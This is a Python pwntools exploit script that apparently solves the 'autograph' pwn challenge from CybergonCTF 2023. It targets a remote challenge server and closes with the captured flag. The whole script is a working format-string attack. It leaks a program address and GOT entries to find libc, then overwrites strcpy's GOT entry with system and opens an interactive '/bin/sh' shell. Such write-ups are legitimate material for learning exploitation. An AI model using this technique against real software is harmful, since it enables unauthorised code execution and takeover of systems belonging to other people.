#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./autograph_patched")
libc = ELF('./libc6_2.35-0ubuntu3_amd64.so')

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("cybergon2023.webhop.me", 5001)
	else:
		r = process([exe.path])
	return r


def main():
	r = conn()

	r.recvuntil(b'choice: ')
	r.sendline(b'9')

	r.recvuntil(b'notes: ')
	r.sendline(b'%34$p')
	r.recvuntil(b'0x')
	elf_leak = int(r.recvuntil(b'\n', drop=True), 16)
	exe.address = elf_leak - (0x561556ba141f - 0x561556ba0000)

	success(f'{hex(exe.address)=}')

	def leak_got(func):
		r.recvuntil(b'choice: ')
		r.sendline(b'9')
		r.recvuntil(b'notes: ')
		r.sendline(b'----%7$s' + p64(exe.got[func]))
		r.recvuntil(b'----')
		addr = u64(r.recv(6).ljust(8, b'\x00'))
		success(f'{func=} {hex(addr)=}')
		return addr

	puts_addr = leak_got('puts') #     0x7f117483ded0
	printf_addr = leak_got('printf') # 0x7f117481d770
	alarm_addr = leak_got('alarm') #   0x7f11748a75b0

	libc.address = alarm_addr - libc.symbols['alarm']
	assert libc.symbols['puts'] == puts_addr
	assert libc.symbols['printf'] == printf_addr
	success(f'{hex(libc.address)=}')


	r.recvuntil(b'choice: ')
	r.sendline(b'1')
	r.recvuntil(b'notes: ')
	r.sendline(b'/bin/sh')

	writes = {exe.got['strcpy']: libc.symbols['system']}
	payload = fmtstr_payload(6, writes, write_size='short')

	r.recvuntil(b'choice: ')
	r.sendline(b'9')
	r.recvuntil(b'notes: ')
	r.sendline(payload)

	r.recvuntil(b'choice: ')
	r.sendline(b'1')
	r.recvuntil(b'notes: ')
	r.sendline(b'')

	r.interactive()



if __name__ == "__main__":
	main()

# CybergonCTF{PHorM47_57rin9-I5_d4N93rou5}
